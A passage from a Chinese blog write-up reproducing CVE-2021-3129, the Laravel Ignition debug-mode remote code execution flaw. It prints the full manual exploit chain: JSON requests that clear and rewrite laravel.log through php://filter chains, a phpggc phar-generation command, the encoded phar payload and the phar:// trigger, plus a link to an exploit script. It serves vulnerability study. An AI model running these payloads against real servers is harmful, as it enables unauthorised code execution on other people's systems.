+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;solution&quot;</span>:<span class="string">&quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;</span>,<span class="attr">&quot;parameters&quot;</span>:&#123;<span class="attr">&quot;variableName&quot;</span>:<span class="string">&quot;username&quot;</span>,<span class="attr">&quot;viewFile&quot;</span>:<span class="string">&quot;php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/laravel8-debug-rce/image-20210608092322607.png?lastModify=1623115607" class="lazyload" data-srcset="/img/laravel8-debug-rce/image-20210608092322607.png?lastModify=1623115607" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210608092322607"></p>
+<p>OK，终于可控了~</p>
+<p><img src="/img/laravel8-debug-rce/image-20210608092359658.png?lastModify=1623115607" class="lazyload" data-srcset="/img/laravel8-debug-rce/image-20210608092359658.png?lastModify=1623115607" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210608092359658"></p>
+<h2 id="4-漏洞利用"><a href="#4-漏洞利用" class="headerlink" title="4. 漏洞利用"></a>4. 漏洞利用</h2><h3 id="4-1-手工利用"><a href="#4-1-手工利用" class="headerlink" title="4.1 手工利用"></a>4.1 手工利用</h3><p>4.1.1 清空日志</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;solution&quot;</span>:<span class="string">&quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;</span>,<span class="attr">&quot;parameters&quot;</span>:&#123;<span class="attr">&quot;variableName&quot;</span>:<span class="string">&quot;username&quot;</span>,<span class="attr">&quot;viewFile&quot;</span>:<span class="string">&quot;php://filter/read=consumed/resource=../storage/logs/laravel.log&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>4.1.2 写入填充对齐数据</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;solution&quot;</span>:<span class="string">&quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;</span>,<span class="attr">&quot;parameters&quot;</span>:&#123;<span class="attr">&quot;variableName&quot;</span>:<span class="string">&quot;username&quot;</span>,<span class="attr">&quot;viewFile&quot;</span>:<span class="string">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>4.1.3 生成并写入 phar payload</p>
+<p>4.1.3.1 生成phar payload</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -d <span class="string">&#x27;phar.readonly=0&#x27;</span> ./phpggc monolog/rce1 call_user_func phpinfo --phar phar -o php://output | base64 -b0 | sed -E <span class="string">&#x27;s/=+$//g&#x27;</span> | sed -E <span class="string">&#x27;s/./&amp;=00/g&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>4.1.3.2 写入phar payload 数据 (4.1.3.1 生成的)</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;solution&quot;</span>:<span class="string">&quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;</span>,<span class="attr">&quot;parameters&quot;</span>:&#123;<span class="attr">&quot;variableName&quot;</span>:<span class="string">&quot;username&quot;</span>,<span class="attr">&quot;viewFile&quot;</span>:<span class="string">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP=00D=009=00w=00a=00H=00A=00g=00X=001=009=00I=00Q=00U=00x=00U=00X=000=00N=00P=00T=00V=00B=00J=00T=00E=00V=00S=00K=00C=00k=007=00I=00D=008=00+=00D=00Q=00r=00Z=00A=00g=00A=00A=00A=00g=00A=00A=00A=00B=00E=00A=00A=00A=00A=00B=00A=00A=00A=00A=00A=00A=00C=00C=00A=00g=00A=00A=00T=00z=00o=00z=00M=00j=00o=00i=00T=00W=009=00u=00b=002=00x=00v=00Z=001=00x=00I=00Y=00W=005=00k=00b=00G=00V=00y=00X=00F=00N=005=00c=002=00x=00v=00Z=001=00V=00k=00c=00E=00h=00h=00b=00m=00R=00s=00Z=00X=00I=00i=00O=00j=00E=006=00e=003=00M=006=00O=00T=00o=00i=00A=00C=00o=00A=00c=002=009=00j=00a=002=00V=000=00I=00j=00t=00P=00O=00j=00I=005=00O=00i=00J=00N=00b=002=005=00v=00b=00G=009=00n=00X=00E=00h=00h=00b=00m=00R=00s=00Z=00X=00J=00c=00Q=00n=00V=00m=00Z=00m=00V=00y=00S=00G=00F=00u=00Z=00G=00x=00l=00c=00i=00I=006=00N=00z=00p=007=00c=00z=00o=00x=00M=00D=00o=00i=00A=00C=00o=00A=00a=00G=00F=00u=00Z=00G=00x=00l=00c=00i=00I=007=00T=00z=00o=00y=00O=00T=00o=00i=00T=00W=009=00u=00b=002=00x=00v=00Z=001=00x=00I=00Y=00W=005=00k=00b=00G=00V=00y=00X=00E=00J=001=00Z=00m=00Z=00l=00c=00k=00h=00h=00b=00m=00R=00s=00Z=00X=00I=00i=00O=00j=00c=006=00e=003=00M=006=00M=00T=00A=006=00I=00g=00A=00q=00A=00G=00h=00h=00b=00m=00R=00s=00Z=00X=00I=00i=00O=000=004=007=00c=00z=00o=00x=00M=00z=00o=00i=00A=00C=00o=00A=00Y=00n=00V=00m=00Z=00m=00V=00y=00U=002=00l=006=00Z=00S=00I=007=00a=00T=00o=00t=00M=00T=00t=00z=00O=00j=00k=006=00I=00g=00A=00q=00A=00G=00J=001=00Z=00m=00Z=00l=00c=00i=00I=007=00Y=00T=00o=00x=00O=00n=00t=00p=00O=00j=00A=007=00Y=00T=00o=00y=00O=00n=00t=00p=00O=00j=00A=007=00c=00z=00o=003=00O=00i=00J=00w=00a=00H=00B=00p=00b=00m=00Z=00v=00I=00j=00t=00z=00O=00j=00U=006=00I=00m=00x=00l=00d=00m=00V=00s=00I=00j=00t=00O=00O=003=001=009=00c=00z=00o=004=00O=00i=00I=00A=00K=00g=00B=00s=00Z=00X=00Z=00l=00b=00C=00I=007=00T=00j=00t=00z=00O=00j=00E=000=00O=00i=00I=00A=00K=00g=00B=00p=00b=00m=00l=000=00a=00W=00F=00s=00a=00X=00p=00l=00Z=00C=00I=007=00Y=00j=00o=00x=00O=003=00M=006=00M=00T=00Q=006=00I=00g=00A=00q=00A=00G=00J=001=00Z=00m=00Z=00l=00c=00k=00x=00p=00b=00W=00l=000=00I=00j=00t=00p=00O=00i=000=00x=00O=003=00M=006=00M=00T=00M=006=00I=00g=00A=00q=00A=00H=00B=00y=00b=002=00N=00l=00c=003=00N=00v=00c=00n=00M=00i=00O=002=00E=006=00M=00j=00p=007=00a=00T=00o=00w=00O=003=00M=006=00N=00z=00o=00i=00Y=003=00V=00y=00c=00m=00V=00u=00d=00C=00I=007=00a=00T=00o=00x=00O=003=00M=006=00M=00T=00Q=006=00I=00m=00N=00h=00b=00G=00x=00f=00d=00X=00N=00l=00c=00l=009=00m=00d=00W=005=00j=00I=00j=00t=009=00f=00X=00M=006=00M=00T=00M=006=00I=00g=00A=00q=00A=00G=00J=001=00Z=00m=00Z=00l=00c=00l=00N=00p=00e=00m=00U=00i=00O=002=00k=006=00L=00T=00E=007=00c=00z=00o=005=00O=00i=00I=00A=00K=00g=00B=00i=00d=00W=00Z=00m=00Z=00X=00I=00i=00O=002=00E=006=00M=00T=00p=007=00a=00T=00o=00w=00O=002=00E=006=00M=00j=00p=007=00a=00T=00o=00w=00O=003=00M=006=00N=00z=00o=00i=00c=00G=00h=00w=00a=00W=005=00m=00b=00y=00I=007=00c=00z=00o=001=00O=00i=00J=00s=00Z=00X=00Z=00l=00b=00C=00I=007=00T=00j=00t=009=00f=00X=00M=006=00O=00D=00o=00i=00A=00C=00o=00A=00b=00G=00V=002=00Z=00W=00w=00i=00O=000=004=007=00c=00z=00o=00x=00N=00D=00o=00i=00A=00C=00o=00A=00a=00W=005=00p=00d=00G=00l=00h=00b=00G=00l=006=00Z=00W=00Q=00i=00O=002=00I=006=00M=00T=00t=00z=00O=00j=00E=000=00O=00i=00I=00A=00K=00g=00B=00i=00d=00W=00Z=00m=00Z=00X=00J=00M=00a=00W=001=00p=00d=00C=00I=007=00a=00T=00o=00t=00M=00T=00t=00z=00O=00j=00E=00z=00O=00i=00I=00A=00K=00g=00B=00w=00c=00m=009=00j=00Z=00X=00N=00z=00b=003=00J=00z=00I=00j=00t=00h=00O=00j=00I=006=00e=002=00k=006=00M=00D=00t=00z=00O=00j=00c=006=00I=00m=00N=001=00c=00n=00J=00l=00b=00n=00Q=00i=00O=002=00k=006=00M=00T=00t=00z=00O=00j=00E=000=00O=00i=00J=00j=00Y=00W=00x=00s=00X=003=00V=00z=00Z=00X=00J=00f=00Z=00n=00V=00u=00Y=00y=00I=007=00f=00X=001=009=00B=00Q=00A=00A=00A=00G=00R=001=00b=00W=001=005=00B=00A=00A=00A=00A=00D=00w=00d=00v=002=00A=00E=00A=00A=00A=00A=00D=00H=005=00/=002=00K=00Q=00B=00A=00A=00A=00A=00A=00A=00A=00A=00C=00A=00A=00A=00A=00H=00R=00l=00c=003=00Q=00u=00d=00H=00h=000=00B=00A=00A=00A=00A=00D=00w=00d=00v=002=00A=00E=00A=00A=00A=00A=00D=00H=005=00/=002=00K=00Q=00B=00A=00A=00A=00A=00A=00A=00A=00A=00d=00G=00V=00z=00d=00H=00R=00l=00c=003=00R=00P=00k=00R=00y=00Q=00r=00k=00B=00t=00D=007=001=003=00E=00z=00J=00P=00B=00n=00I=00w=00c=00c=00v=00F=00o=00A=00I=00A=00A=00A=00B=00H=00Q=00k=001=00C=00=00&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>因为payload比较长，所以是前奇后偶型，注意别忘了在最后还要补上一个 <code>=00</code> 这里已经补上了</p>
+<p>4.1.4 把日志文件转换为仅剩phar数据</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;solution&quot;</span>:<span class="string">&quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;</span>,<span class="attr">&quot;parameters&quot;</span>:&#123;<span class="attr">&quot;variableName&quot;</span>:<span class="string">&quot;username&quot;</span>,<span class="attr">&quot;viewFile&quot;</span>:<span class="string">&quot;php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>4.1.5 通过file_get_contents触发phar反序列化</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;solution&quot;</span>:<span class="string">&quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;</span>,<span class="attr">&quot;parameters&quot;</span>:&#123;<span class="attr">&quot;variableName&quot;</span>:<span class="string">&quot;username&quot;</span>,<span class="attr">&quot;viewFile&quot;</span>:<span class="string">&quot;phar:///Users/tari/Sites/laravel/storage/logs/laravel.log/test.txt&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>注意这里的路由必须为绝对路径（相对路径试过了会报错）</p>
+<p>不过绝对路径也是已知的，可以通过报错信息获取~</p>
+<p><img src="/img/laravel8-debug-rce/image-20210609001508013.png" class="lazyload" data-srcset="/img/laravel8-debug-rce/image-20210609001508013.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210609001508013"></p>
+<h3 id="4-2-脚本利用"><a href="#4-2-脚本利用" class="headerlink" title="4.2 脚本利用"></a>4.2 脚本利用</h3><p>改进了一下原有脚本，可以兼容laravel的<code>artisan serv</code> 和 apache代理（路由后面少个 <code>/</code>）启动模式</p>
+<p>测试PHP版本为 PHP7.3.24 </p>
+<a class="button" href='/static/2021/06/09/cve-2021-3129.py' title='cve-2021-3129.py'><i class='fas fa-download'></i>cve-2021-3129.py</a>
+
+<p>PHP 8 用不了，可能是因为 monolog 的gadget有问题</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>本次漏洞踩了的坑很多</p>
+<ul>
+<li>在 base64过滤器里，理解了挺久一些字符串还原特性<sup>[5]</sup>的，然后清空中过滤器与<code>base64_decode</code>函数不同的坑也踩了，原来过滤器中，中间不能用 <code>=</code> 号。顺便深入理解了baes64编码的原理，解码的条件。</li>
+<li>了解了PHP伪协议一些不太常见的过滤器，原来还可以联合起来，配合报错日志这样玩，，这样构造仅有我们想要的内容</li>
+<li>在字节对齐这理解了很久，也是有 <code>=</code> 号产生的坑，做了很多不同实验踩才理解透彻</li>
+</ul>
+<p>虽然 虽然漏洞点不在很深的位置，但是不明显，<code>file_get_contents</code> 和 <code>file_put_contents</code> 都绑定了，当时打ctf遇到这个确实没啥好的思路。</p>
+<p>虽然花了几天复现这个漏洞，不过学了很多新的东西，也对旧的知识（base64、phar等）做了巩固和更深入的理解和应用。</p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>[1] <a target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/CVE-2021-3129">NVD - CVE-2021-3129 (nist.gov)</a></p>
+<p>[2] <a target="_blank" rel="noopener" href="https://github.com/advisories/GHSA-4qwp-7c67-jmcc">Unauthenticated remote code execution in Ignition · CVE-2021-3129 · GitHub Advisory Database</a></p>
+<p>[3] <a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/344568679">Laravel Debug模式下远程代码执行漏洞分析 - 知乎 (zhihu.com)</a></p>
+<p>[4] <a target="_blank" rel="noopener" href="https://www.ambionics.io/blog/laravel-debug-rce">Laravel &lt;= v8.4.2 debug mode: Remote code execution (ambionics.io)</a></p>
+<p>[5] <a target="_blank" rel="noopener" href="https://blog.orange.tw/2018/10/hitcon-ctf-2018-one-line-php-challenge.html?showComment=1542930757921#c4662468249956324472">Orange: HITCON CTF 2018 - One Line PHP Challenge</a></p>
+<p>[6] <a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/k08P2Uij_4ds35FxE2eh0g">漏洞分析 | Laravel Debug页面RCE（CVE-2021-3129）分析复现 (qq.com)</a></p>
+
+  
+  
+    
+    <div class='footer'>
+      
+      
+      
+        <div class='copyright'>
+          <blockquote>
+            
+              
+                <p>博客内容遵循 署名-非商业性使用-相同方式共享 4.0 国际 (CC BY-NC-SA 4.0) 协议</p>
+
+              
+            
+              
+                <p>本文永久链接是：<a href=https://tari.moe/2021/06/03/laravel8-debug-rce/>https://tari.moe/2021/06/03/laravel8-debug-rce/</a></p>
+              
+            
+          </blockquote>
+        </div>
+      
+      
+    </div>
+  
+  
+    
+
+
+  <div class='article-meta' id="bottom">
+    <div class='new-meta-box'>
+      
+        
+          
+  
+  <div class="new-meta-item meta-tags"><a class="tag" href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>漏洞复现</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/ignition/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>ignition</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/Laravel8/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>Laravel8</p></a></div>
+
+
+        
+      
+    </div>
+  </div>
+
+
+  
+  
+
+  
+    <div class="prev-next">
+      
+      
+        <a class='next' href='/2021/05/23/2021gd-university-ctf/'>
+          <p class='title'>Web writeup | 2021年第一届广东大学生网络安全攻防大赛-晋级赛<i class="fas fa-chevron-right" aria-hidden="true"></i></p>
+          <p class='content'>
+
+前言实力吐槽这次比赛
+
+初赛环境老是炸，最后30多分钟都炸了，答案都提交不了
+晋级塞，，题目也偶尔会出现断开的问题，，第二个web题，，竟然一开始直接返回空，后来又可以了？？不知道是不是只有...</p>
+        </a>
+      
+    </div>
+  
+</article>
+
+
+  
+
+  <article class="post white-box reveal shadow" id="comments">
+    <p ct><i class='fas fa-comments'></i> 评论</p>
+    
+    <div id="gitalk-container"></div>
+
+  </article>
+
+
+
+
+
+
+</div>
+<aside class='l_side'>
+  
+  
+    
+    
+
+
+
+  <section class="widget toc-wrapper shadow desktop mobile" id="toc-div" >
+    
+  <header>
+    
+      <i class="fas fa-list fa-fw" aria-hidden="true"></i><span class='name'>文档目录</span>
+    
+  </header>
+
+
+    <div class='content'>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E5%89%8D%E8%A8%80"><span class="toc-text">1. 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-text">2. 环境搭建</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-%E5%AE%89%E8%A3%85-composer"><span class="toc-text">2.1 安装 composer</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-%E5%AE%89%E8%A3%85-Laravel"><span class="toc-text">2.2 安装 Laravel</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-3-%E7%BC%96%E5%86%99%E6%BC%8F%E6%B4%9E%E5%85%A5%E5%8F%A3%E4%BB%A3%E7%A0%81"><span class="toc-text">2.3 编写漏洞入口代码</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-text">3. 漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-1-%E8%A7%A6%E5%8F%91%E7%82%B9%E8%B7%AF%E7%94%B1%E8%BF%BD%E8%B8%AA"><span class="toc-text">3.1 触发点路由追踪</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-2-%E6%BC%8F%E6%B4%9E%E7%82%B9%E5%88%86%E6%9E%90"><span class="toc-text">3.2 漏洞点分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-3-%E5%B0%9D%E8%AF%95-base64-%E8%BF%87%E6%BB%A4%E5%99%A8%E4%BF%AE%E6%94%B9%E5%86%85%E5%AE%B9"><span class="toc-text">3.3 尝试 base64 过滤器修改内容</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-4-%E8%80%83%E8%99%91%E5%85%B6%E4%BB%96-filter-%E8%BF%87%E6%BB%A4%E5%99%A8"><span class="toc-text">3.4 考虑其他 filter 过滤器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-5-%E4%B8%A4%E4%B8%AAPAYLOAD%E5%92%8C%E5%8F%8C%E5%AD%97%E8%8A%82%E5%AF%B9%E9%BD%90"><span class="toc-text">3.5 两个PAYLOAD和双字节对齐</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-6-%E6%95%B4%E5%90%88"><span class="toc-text">3.6 整合</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-text">4. 漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#4-1-%E6%89%8B%E5%B7%A5%E5%88%A9%E7%94%A8"><span class="toc-text">4.1 手工利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-2-%E8%84%9A%E6%9C%AC%E5%88%A9%E7%94%A8"><span class="toc-text">4.2 脚本利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-text">总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-text">参考链接</span></a></li></ol>
+    </div>
+  </section>
+
+
+  
+
+
+</aside>
+
+
+
+		  
+		  <!--此文件用来存放一些不方便取值的变量-->
+<!--思路大概是将值藏到重加载的区域内-->
+
+<script>
+  window.pdata={}
+  pdata.ispage=true;
+  pdata.postTitle="Laravel8 CVE-2021-3129 复现分析";
+  pdata.commentPath="";
+  pdata.commentPlaceholder="";
+  // header 这里无论是否开启pjax都需要
+  var l_header=document.getElementById("l_header");
+  
+  l_header.classList.add("show");
+  
+  
+    // cover
+    var cover_wrapper=document.querySelector('.cover-wrapper');
+    
+    cover_wrapper.id="none";
+    cover_wrapper.style.display="none";
+    
+  
+</script>
+
+        </div>
+        
+  
+  <footer class="footer clearfix">
+    <br><br>
+    
+      
+        本站使用
+        <a href="https://github.com/volantis-x/hexo-theme-volantis/tree/4.3.1" target="_blank" class="codename">Volantis</a>
+        作为主题
+      
+    
+      
+        
+          <div><p><span id="lc-sv">本站总访问量为 <span id='number'><i class="fas fa-circle-notch fa-spin fa-fw" aria-hidden="true"></i></span> 次</span> <span id="lc-uv">访客数为 <span id='number'><i class="fas fa-circle-notch fa-spin fa-fw" aria-hidden="true"></i></span> 人</span></p>
+</div>
+        
+      
+    
+      
+        
+          <div><p>本站托管于 <a target="_blank" rel="noopener" href="https://pages.github.com/">Github Page</a> &amp;&amp; CDN 使用 <a target="_blank" rel="noopener" href="https://www.jsdelivr.com/">JSDELIVR</a></p>
+</div>
+        
+      
+    
+      
+        <div><p>博客内容遵循 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">署名-非商业性使用-相同方式共享 4.0 国际 (CC BY-NC-SA 4.0) 协议</a></p>
+</div>
+      
+    
+      
+        <div class='copyright'>
+        <p><a href="/">Copyright © 2019-2021 TARI TARI</a></p>
+
+        </div>
+      
+    
+  </footer>
+
+
+        <a id="s-top" class="fas fa-arrow-up fa-fw" href="javascript:void(0)"></a>
+      </div>
+    </div>
+    <div>
+      <script>
+/************这个文件存放不需要重载的全局变量和全局函数*********/
+window.volantis={};
+window.volantis.loadcss=document.getElementById("loadcss");
+/******************** Pjax ********************************/
+function VPjax(){
+	this.list=[] // 存放回调函数
+	this.start=()=>{
+	  for(var i=0;i<this.list.length;i++){
+		this.list[i].run();
+	  }
+	}
+	this.push=(fn,name)=>{
+		var f=new PjaxItem(fn,name);
+		this.list.push(f);
+	}
+	// 构造一个可以run的对象
+	function PjaxItem(fn,name){
+		// 函数名称
+		this.name = name || fn.name
+		// run方法
+		this.run=()=>{
+			fn()
+		}
+	}
+}
+volantis.pjax={}
+volantis.pjax.method={
+	complete: new VPjax(),
+	error: new VPjax(),
+	send: new VPjax()
+}
+volantis.pjax={
+	...volantis.pjax,
+	push: volantis.pjax.method.complete.push,
+	error: volantis.pjax.method.error.push,
+	send: volantis.pjax.method.send.push
+}
+/********************脚本懒加载函数********************************/
+// 已经加入了setTimeout
+function loadScript(src, cb) {
+	setTimeout(function() {
+		var HEAD = document.getElementsByTagName('head')[0] || document.documentElement;
+		var script = document.createElement('script');
+		script.setAttribute('type','text/javascript');
+		if (cb) script.onload = cb;
+		script.setAttribute('src', src);
+		HEAD.appendChild(script);
+	});
+}
+//https://github.com/filamentgroup/loadCSS
+var loadCSS = function( href, before, media, attributes ){
+	var doc = window.document;
+	var ss = doc.createElement( "link" );
+	var ref;
+	if( before ){
+		ref = before;
+	}
+	else {
+		var refs = ( doc.body || doc.getElementsByTagName( "head" )[ 0 ] ).childNodes;
+		ref = refs[ refs.length - 1];
+	}
+	var sheets = doc.styleSheets;
+	if( attributes ){
+		for( var attributeName in attributes ){
+			if( attributes.hasOwnProperty( attributeName ) ){
+				ss.setAttribute( attributeName, attributes[attributeName] );
+			}
+		}
+	}
+	ss.rel = "stylesheet";
+	ss.href = href;
+	ss.media = "only x";
+	function ready( cb ){
+		if( doc.body ){
+			return cb();
+		}
+		setTimeout(function(){
+			ready( cb );
+		});
+	}
+	ready( function(){
+		ref.parentNode.insertBefore( ss, ( before ? ref : ref.nextSibling ) );
+	});
+	var onloadcssdefined = function( cb ){
+		var resolvedHref = ss.href;
+		var i = sheets.length;
+		while( i-- ){
+			if( sheets[ i ].href === resolvedHref ){
+				return cb();
+			}
+		}
+		setTimeout(function() {
+			onloadcssdefined( cb );
+		});
+	};
+	function loadCB(){
+		if( ss.addEventListener ){
+			ss.removeEventListener( "load", loadCB );
+		}
+		ss.media = media || "all";
+	}
+	if( ss.addEventListener ){
+		ss.addEventListener( "load", loadCB);
+	}
+	ss.onloadcssdefined = onloadcssdefined;
+	onloadcssdefined( loadCB );
+	return ss;
+};
+</script>
+<script>
+  
+  loadCSS("https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.14/css/all.min.css", window.volantis.loadcss);
+  
+  
+  
+  
+</script>
+<!-- required -->
+
+<script src="https://cdn.jsdelivr.net/npm/jquery@3.5/dist/jquery.min.js"></script>
+
+<script>
+  function pjax_fancybox() {
+    $(".md .gallery").find("img").each(function () { //渲染 fancybox
+      var element = document.createElement("a"); // a 标签
+      $(element).attr("class", "fancybox");
+      $(element).attr("pjax-fancybox", "");  // 过滤 pjax
+      $(element).attr("href", $(this).attr("src"));
+      if ($(this).attr("data-original")) {
+        $(element).attr("href", $(this).attr("data-original"));
+      }
+      $(element).attr("data-fancybox", "images");
+      var caption = "";   // 描述信息
+      if ($(this).attr('alt')) {  // 判断当前页面是否存在描述信息
+        $(element).attr('data-caption', $(this).attr('alt'));
+        caption = $(this).attr('alt');
+      }
+      var div = document.createElement("div");
+      $(div).addClass("fancybox");
+      $(this).wrap(div); // 最外层套 div ，其实主要作用还是 class 样式
+      var span = document.createElement("span");
+      $(span).addClass("image-caption");
+      $(span).text(caption); // 加描述
+      $(this).after(span);  // 再套一层描述
+      $(this).wrap(element);  // 最后套 a 标签
+    })
+    $(".md .gallery").find("img").fancybox({
+      selector: '[data-fancybox="images"]',
+      hash: false,
+      loop: false,
+      closeClick: true,
+      helpers: {
+        overlay: {closeClick: true}
+      },
+      buttons: [
+        "zoom",
+        "close"
+      ]
+    });
+  };
+  function SCload_fancybox() {
+    if ($(".md .gallery").find("img").length == 0) return;
+    loadCSS("https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css", document.getElementById("loadcss"));
+    loadScript('https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js', pjax_fancybox)
+  };
+  $(function () {
+    SCload_fancybox();
+  });
+  function Pjax_SCload_fancybox(){
+	if (typeof $.fancybox == "undefined") {
+	 SCload_fancybox();
+    } else {
+	 pjax_fancybox();
+    }
+  }
+  volantis.pjax.push(Pjax_SCload_fancybox)
+  volantis.pjax.send(()=>{
+      if (typeof $.fancybox != "undefined") {
+        $.fancybox.close();    // 关闭弹窗
+      }
+  },'fancybox')
+</script>
+
+
+<!-- internal -->
+
+
+
+
+<script>
+  function loadIssuesJS() {
+    if ($(".md").find(".issues-api").length == 0) return;
+	
+	  loadScript('https://cdn.jsdelivr.net/npm/hexo-theme-volantis@4.3.1/source/js/issues.min.js');
+	
+  };
+  $(function () {
+    loadIssuesJS();
+  });
+  volantis.pjax.push(()=>{
+	if (typeof IssuesAPI == "undefined") {
+	  loadIssuesJS();
+	}
+  },"IssuesJS")
+</script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/vanilla-lazyload@17.1.0/dist/lazyload.min.js"></script>
+<script>
+  // https://www.npmjs.com/package/vanilla-lazyload
+  // Set the options globally
+  // to make LazyLoad self-initialize
+  window.lazyLoadOptions = {
+    elements_selector: ".lazyload",
+    threshold: 0
+  };
+  // Listen to the initialization event
+  // and get the instance of LazyLoad
+  window.addEventListener(
+    "LazyLoad::Initialized",
+    function (event) {
+      window.lazyLoadInstance = event.detail.instance;
+    },
+    false
+  );
+  document.addEventListener('DOMContentLoaded', function () {
+    lazyLoadInstance.update();
+  });
+  document.addEventListener('pjax:complete', function () {
+    lazyLoadInstance.update();
+  });
+</script>
+
+
+
+
+  
+
+<script>
+  window.FPConfig = {
+	delay: 0,
+	ignoreKeywords: [],
+	maxRPS: 5,
